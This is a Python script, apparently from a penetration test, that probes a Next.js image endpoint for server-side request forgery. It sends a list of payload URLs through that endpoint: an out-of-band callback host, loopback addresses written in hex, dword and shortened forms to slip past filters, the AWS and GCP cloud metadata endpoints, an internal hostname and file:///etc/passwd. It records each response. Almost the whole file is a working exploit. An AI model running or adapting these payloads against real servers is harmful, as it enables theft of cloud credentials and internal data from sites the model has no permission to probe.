#!/usr/bin/env python3
"""SSRF proof on Next.js /_next/image?url= — real callback, plus internal targets."""
import sys, json, time
sys.path.insert(0,'/work')
import icp
from urllib.parse import quote

HOST = "oobe6c32b7155cd.dau2p4ghgqag02k5emggc5cu6hph3m973"  # placeholder, replaced below
HOST = "oobe6c32b7155cd.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

CASES = [
  ("direct-plain",   "http://" + HOST + "/ssrf-plain"),
  ("direct-bypass",  "http://" + HOST + "/ssrf-bypass"),
  ("redirect-ish",   "http://" + HOST + "/ssrf-probe.jpg"),
  ("local-ip",       "http://127.0.0.1:80/_next/static/chunks/main-app-2dcde4753ea0d175.js"),
  ("localhost",      "http://localhost:3000/"),
  ("v4-mapped",      "http://0x7f000001/"),
  ("v4-dword",       "http://2130706433/"),
  ("v4-dec",         "http://127.1/"),
  ("metadata-aws",   "http://169.254.169.254/latest/meta-data/"),
  ("metadata-gcp",   "http://metadata.google.internal/computeMetadata/v1/"),
  ("internal-svc",   "http://infinitycapital.bh./"),
  ("env-refused",    "file:///etc/passwd"),
]

out = []
for label, url in CASES:
    q = '/_next/image?url=' + quote(url, safe='') + '&w=1080&q=75'
    c, b, h = icp.fetch(q, out='/tmp/img_%s.bin' % label)
    snip = b[:200].decode('utf-8','replace') if len(b) < 2000 else ('<%d bytes>' % len(b))
    ct = [l for l in h.splitlines() if l.lower().startswith('content-type')]
    print("%-14s %s len=%-6d %s %s" % (label, c, len(b), ct, snip[:150].replace('\n',' ')))
    out.append({"label":label,"url":url,"code":c,"len":len(b),"ct":ct,"head":snip})
    time.sleep(1)

json.dump(out, open('/work/tool_outputs/ssrf_image_proof.json','w'), indent=1)
